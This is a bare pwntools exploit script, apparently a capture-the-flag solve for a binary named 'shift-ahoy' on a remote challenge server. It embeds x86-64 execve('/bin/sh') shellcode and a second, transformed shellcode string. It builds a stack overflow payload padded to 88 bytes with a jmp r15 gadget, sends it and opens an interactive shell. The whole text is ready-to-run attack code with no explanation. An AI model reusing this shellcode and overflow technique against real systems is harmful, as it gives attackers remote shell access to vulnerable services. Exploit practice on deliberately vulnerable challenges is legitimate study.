from pwn import *

DEBUG = False

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

mov_r15_rsp = p64(0x00000000004012e1)
jmp_r15 = p64(0x00000000004011cd)

sc_1 = "\x5d\x35\x4b\xf1\xb7\x3b\x8c\x45\x3b\xb2\x22\x55\x5c\x61\x22\x22\x66\x5b\x4a\x47\x51\x3c\x7c\xc3\x3c\x7c\xc5\x02\xf8"

rop = sc_1 + "\x90"*(88-len(sc_1)) + jmp_r15

if DEBUG:
    p = process("./shift-ahoy")
else:
    p = remote("jh2i.com", 50015)

p.recvuntil("> ")
p.sendline("1")
p.recvuntil(": ")
p.sendline(rop)
p.interactive()

